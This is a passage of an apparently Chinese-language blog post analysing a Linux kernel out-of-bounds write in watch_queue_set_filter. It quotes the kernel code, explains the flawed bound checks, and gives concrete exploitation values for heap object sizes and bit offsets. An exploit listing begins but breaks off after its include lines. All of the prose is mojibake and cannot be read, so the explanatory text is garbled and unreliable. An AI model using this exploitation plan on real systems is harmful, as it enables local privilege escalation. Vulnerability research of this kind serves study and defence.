class="line">&#125;</span><br></pre></td></tr></table></figure><p>è€Œåœ¨å‡½æ•°å†…éƒ¨å…¶å®ä¹Ÿå°±æ˜¯ä¸ªå¤§çš„<code>switch</code>è¯­å¥ï¼Œå¹¶ä¸”åœ¨æœ€åæœ‰ä¸€ä¸ªå¤„ç†<code>watch_queue_set_filter</code>å‡½æ•°ï¼Œè€Œæ¼æ´æ­£å‘ç”Ÿåœ¨å…¶ä¸­ã€‚</p><h2 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h2><h3 id="æ¼æ´ç‚¹ä¸€"><a href="#æ¼æ´ç‚¹ä¸€" class="headerlink" title="æ¼æ´ç‚¹ä¸€"></a>æ¼æ´ç‚¹ä¸€</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">watch_queue_set_filter</span><span class="params">(struct pipe_inode_info *pipe,</span></span></span><br><span class="line"><span class="params"><span class="function">    struct watch_notification_filter __user *_filter)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">watch_notification_type_filter</span> *<span class="title">tf</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">watch_notification_filter</span> <span class="title">filter</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">watch_type_filter</span> *<span class="title">q</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">watch_filter</span> *<span class="title">wfilter</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">watch_queue</span> *<span class="title">wqueue</span> =</span> pipe-&gt;watch_queue;</span><br><span class="line"><span class="keyword">int</span> ret, nr_filter = <span class="number">0</span>, i;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!wqueue)</span><br><span class="line"><span class="keyword">return</span> -ENODEV;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!_filter) &#123;</span><br><span class="line"><span class="comment">/* Remove the old filter */</span></span><br><span class="line">wfilter = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">goto</span> <span class="built_in">set</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Grab the user&#x27;s filter specification */</span></span><br><span class="line"><span class="keyword">if</span> (copy_from_user(&amp;filter, _filter, <span class="keyword">sizeof</span>(filter)) != <span class="number">0</span>)</span><br><span class="line"><span class="keyword">return</span> -EFAULT;</span><br><span class="line"><span class="keyword">if</span> (filter.nr_filters == <span class="number">0</span> ||</span><br><span class="line">    filter.nr_filters &gt; <span class="number">16</span> ||</span><br><span class="line">    filter.__reserved != <span class="number">0</span>)</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">tf = memdup_user(_filter-&gt;filters, filter.nr_filters * <span class="keyword">sizeof</span>(*tf));</span><br><span class="line"><span class="keyword">if</span> (IS_ERR(tf))</span><br><span class="line"><span class="keyword">return</span> PTR_ERR(tf);</span><br><span class="line"></span><br><span class="line">ret = -EINVAL;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; filter.nr_filters; i++) &#123;</span><br><span class="line"><span class="keyword">if</span> ((tf[i].info_filter &amp; ~tf[i].info_mask) ||</span><br><span class="line">    tf[i].info_mask &amp; WATCH_INFO_LENGTH)</span><br><span class="line"><span class="keyword">goto</span> err_filter;</span><br><span class="line"><span class="comment">/* Ignore any unknown types */</span></span><br><span class="line"><span class="keyword">if</span> (tf[i].type &gt;= <span class="keyword">sizeof</span>(wfilter-&gt;type_filter) * <span class="number">8</span>)</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">nr_filter++;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Now we need to build the internal filter from only the relevant</span></span><br><span class="line"><span class="comment"> * user-specified filters.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">ret = -ENOMEM;</span><br><span class="line">wfilter = kzalloc(struct_size(wfilter, filters, nr_filter), GFP_KERNEL);</span><br><span class="line"><span class="keyword">if</span> (!wfilter)</span><br><span class="line"><span class="keyword">goto</span> err_filter;</span><br><span class="line">wfilter-&gt;nr_filters = nr_filter;</span><br><span class="line"></span><br><span class="line">q = wfilter-&gt;filters;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; filter.nr_filters; i++) &#123;</span><br><span class="line"><span class="keyword">if</span> (tf[i].type &gt;= <span class="keyword">sizeof</span>(wfilter-&gt;type_filter) * BITS_PER_LONG)</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">q-&gt;type= tf[i].type;</span><br><span class="line">q-&gt;info_filter= tf[i].info_filter;</span><br><span class="line">q-&gt;info_mask= tf[i].info_mask;</span><br><span class="line">q-&gt;subtype_filter[<span class="number">0</span>]= tf[i].subtype_filter[<span class="number">0</span>];</span><br><span class="line">__set_bit(q-&gt;type, wfilter-&gt;type_filter);</span><br><span class="line">q++;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">kfree(tf);</span><br><span class="line"><span class="built_in">set</span>:</span><br><span class="line">pipe_lock(pipe);</span><br><span class="line">wfilter = rcu_replace_pointer(wqueue-&gt;filter, wfilter,</span><br><span class="line">      lockdep_is_held(&amp;pipe-&gt;mutex));</span><br><span class="line">pipe_unlock(pipe);</span><br><span class="line"><span class="keyword">if</span> (wfilter)</span><br><span class="line">kfree_rcu(wfilter, rcu);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">err_filter:</span><br><span class="line">kfree(tf);</span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é¦–å…ˆåˆ™æ˜¯å°†ç”¨æˆ·ç©ºé—´çš„<code>_filter</code>æ‹·è´åˆ°å†…æ ¸ä¸­ï¼Œæ¥ç€å°±æ˜¯å¯¹ç»“æ„ä½“ä¸­çš„<code>nr_filters</code>å’Œ<code>__reservede</code>æˆå‘˜è¿›è¡ŒéªŒè¯ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (copy_from_user(&amp;filter, _filter, <span class="keyword">sizeof</span>(filter)) != <span class="number">0</span>)</span><br><span class="line">  <span class="keyword">return</span> -EFAULT;</span><br><span class="line"><span class="keyword">if</span> (filter.nr_filters == <span class="number">0</span> ||</span><br><span class="line">    filter.nr_filters &gt; <span class="number">16</span> ||</span><br><span class="line">    filter.__reserved != <span class="number">0</span>)</span><br><span class="line">  <span class="keyword">return</span> -EINVAL;</span><br></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥é€šè¿‡<code>memdup_user</code>å‡½æ•°å°†ç”¨æˆ·æ€<code>struct watch_notification_type_filter filters[]</code>æ•°ç»„æ”¾åˆ°ä¸´æ—¶çš„å†…å­˜ç©ºé—´<code>tf</code>ä¸­ã€‚ç´§æ¥ç€å°†æ ¹æ®<code>filter.nr_filters</code>è¿›è¡Œforå¾ªç¯ï¼Œå¹¶å¯¹<code>tf</code>ä¸­çš„å†…å®¹è¿›è¡Œæ ¡éªŒã€‚å¾…éƒ½é€šè¿‡åˆ™ä¼šæ ¹æ®<code>struct_size(wfilter, filters, nr_filter)</code>ç”Ÿæˆä¸€ä¸ª<code>object</code>ï¼Œè€Œè¿™ä¸ªå®å®šä¹‰çš„å«ä¹‰å…¶å®æ˜¯<code>sizeof(wfilter) + sizeof(filters) * nr_filter</code>ã€‚å¹¶ä¸”éœ€è¦æ³¨æ„çš„æ˜¯è¿™é‡Œ<code>nr_filter</code>å¹¶ä¸æ˜¯ä»»ä½•ç»“æ„ä½“ä¸­çš„æˆå‘˜ï¼Œåªæ˜¯å‡½æ•°å£°æ˜çš„ä¸€ä¸ªå±€éƒ¨å˜é‡</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; filter.nr_filters; i++) &#123;</span><br><span class="line">  <span class="keyword">if</span> (tf[i].type &gt;= <span class="keyword">sizeof</span>(wfilter-&gt;type_filter) * BITS_PER_LONG)</span><br><span class="line">    <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">  q-&gt;type= tf[i].type;</span><br><span class="line">  q-&gt;info_filter= tf[i].info_filter;</span><br><span class="line">  q-&gt;info_mask= tf[i].info_mask;</span><br><span class="line">  q-&gt;subtype_filter[<span class="number">0</span>]= tf[i].subtype_filter[<span class="number">0</span>];</span><br><span class="line">  __set_bit(q-&gt;type, wfilter-&gt;type_filter);</span><br><span class="line">  q++;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¦‚ä¸Šä»£ç ç‰‡æ®µï¼Œåœ¨åé¢é€šè¿‡forå¾ªç¯ä½¿ç”¨çš„å´æ˜¯<code>filter.nr_filters</code>å¹¶ä¸”è¿™é‡Œå¯¹äºtypeçš„éªŒè¯éªŒè¯å’Œä¸Šé¢çš„ä¹Ÿä¸ç›¸åŒã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_64BIT</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BITS_PER_LONG 64</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BITS_PER_LONG 32</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">/* CONFIG_64BIT */</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (tf[i].type &gt;= <span class="keyword">sizeof</span>(wfilter-&gt;type_filter) * <span class="number">8</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (tf[i].type &gt;= <span class="keyword">sizeof</span>(wfilter-&gt;type_filter) * BITS_PER_LONG)</span><br></pre></td></tr></table></figure><p>æ‰€ä»¥ä¸éš¾æƒ³åˆ°çš„æ˜¯å¯ä»¥é€šè¿‡æŒ‡å®š<code>type</code>çš„å€¼ä¸ºè¿™ä¸ª<code>[0x80, 0x400)</code>åŒºé—´å†…çš„ç‰¹å®šå€¼å³å¯å®ç°è¶Šç•Œå†™ã€‚</p><h3 id="æ¼æ´ç‚¹äºŒ"><a href="#æ¼æ´ç‚¹äºŒ" class="headerlink" title="æ¼æ´ç‚¹äºŒ"></a>æ¼æ´ç‚¹äºŒ</h3><p>è€Œç¬¬äºŒä¸ªæ¼æ´ä¹Ÿä½äºåœ¨æœ€åèµ‹å€¼æ—¶çš„<code>__set_bit</code>å‡½æ•°ä¸­</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BIT_MASK(nr)(UL(1) &lt;&lt; ((nr) % BITS_PER_LONG))</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BIT_WORD(nr)((nr) / BITS_PER_LONG)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> __set_bit(<span class="keyword">int</span> nr, <span class="keyword">volatile</span> <span class="keyword">unsigned</span> <span class="keyword">long</span> *addr)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> mask = BIT_MASK(nr);</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> *p = ((<span class="keyword">unsigned</span> <span class="keyword">long</span> *)addr) + BIT_WORD(nr);</span><br><span class="line"></span><br><span class="line">*p  |= mask;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªå‡½æ•°çš„ä½œç”¨å°±æ˜¯å°†<code>addr</code>åç§»ä¸º<code>BIT_WORD(nr)</code>å¤„çš„<code>BIT_MASK(nr)</code>ä½ç½®ä¸º1ï¼Œå› ä¸ºtypeæ˜¯å¯æ§çš„ï¼Œæ‰€ä»¥æ§åˆ¶å¾—å½“çš„è¯å¯ä»¥è¶Šç•Œç½®ä¸€ä½ä¸º1ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">watch_type_filter</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">watch_notification_type</span> <span class="title">type</span>;</span></span><br><span class="line">__u32subtype_filter[<span class="number">1</span>];<span class="comment">/* Bitmask of subtypes to filter on */</span></span><br><span class="line">__u32info_filter;<span class="comment">/* Filter on watch_notification::info */</span></span><br><span class="line">__u32info_mask;<span class="comment">/* Mask of relevant bits in info_filter */</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">watch_filter</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span><span class="title">rcu</span>;</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span>type_filter[<span class="number">2</span>];<span class="comment">/* Bitmask of accepted types */</span></span><br><span class="line">&#125;;</span><br><span class="line">u32nr_filters;<span class="comment">/* Number of filters */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">watch_type_filter</span> <span class="title">filters</span>[];</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>ä¸Šé¢çš„<code>watch_filter</code>é•¿è¿™æ ·ã€‚</p><h2 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h2><p>ç½‘ä¸Šçš„æœ‰å…³è¿™ä¸ªCVEä½¿ç”¨çš„æ–¹æ³•å‡ ä¹éƒ½æ˜¯åˆ©ç”¨çš„æ¼æ´äºŒã€‚å½“ç„¶ï¼Œä»”ç»†æƒ³ä¸€ä¸‹ä¹Ÿä¼šå‘ç°æ¼æ´äºŒåœ¨åˆ©ç”¨çš„è¿‡ç¨‹ä¸­æ›´ä¸ºæ˜“ç”¨ã€‚æ¥ç€å°±æ˜¯æ€è€ƒæº¢å‡ºé—®é¢˜äº†ï¼Œè‹¥æ˜¯æˆ‘ä»¬é€‰æ‹©ä¸€ä¸ªtypeä¸º0x30açš„è¯ï¼Œæˆ‘ä»¬å¾—åˆ°çš„åç§»ä¸º<code>(0x30a / 64) * 8 = 0x60</code>ï¼Œæ‰€ä»¥æˆ‘ä»¬åªéœ€è¦è®©ä¸Šé¢çš„<code>object</code>çš„å¤§å°ä¸º0x60å³å¯å½±å“åˆ°åé¢çš„objectäº†ã€‚æ‰€ä»¥æˆ‘ä»¬è¿™é‡Œé€‰æ‹©çš„<code>nr_filters</code>ä¸º4ï¼Œé™¤å»ä¸Šé¢çš„è¿™ä¸€ä¸ªå³ä¸º3ã€‚é‚£ä¹ˆæ­¤æ—¶å†…æ ¸ç»™<code>wfilter</code>åˆ†é…çš„å¤§å°ä¸º<code>0x18 + 3 * 0x10 = 0x48</code>æ‰€ä»¥å¯ä»¥ç”³è¯·åˆ°<code>0x60</code>çš„<code>object</code>ã€‚è¿™æ—¶å†æ ¹æ®<code>BIT_MASK</code>è®¡ç®—å¯å¾—æœ€ç»ˆç»“æœä¸º<code>0x400</code>ã€‚</p><p>å…¶å®è¯´åˆ°è¿™é‡Œçš„æ—¶å€™å„ä½åº”è¯¥éƒ½æƒ³åˆ°äº†è§£é¢˜æ–¹æ³•äº†å§ã€‚å¯¹çš„ï¼Œå¯ä»¥ä½¿ç”¨ <a class="link"   href="https://cv196082.gitee.io/2022/09/20/CVE-2021-22555%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95%E5%88%86%E6%9E%90/" >CVE-2021-22555<i class="fas fa-external-link-alt"></i></a> å³å¯å®Œæˆåç»­åˆ©ç”¨ (è¿™é‡Œä¸å†è¯¦ç»†è§£é‡Šäº†)ã€‚</p><h3 id="ç»¼ä¸Šï¼Œå¯å¾—exp"><a href="#ç»¼ä¸Šï¼Œå¯å¾—exp" class="headerlink" title="ç»¼ä¸Šï¼Œå¯å¾—exp"></a>ç»¼ä¸Šï¼Œå¯å¾—exp</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;err.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span 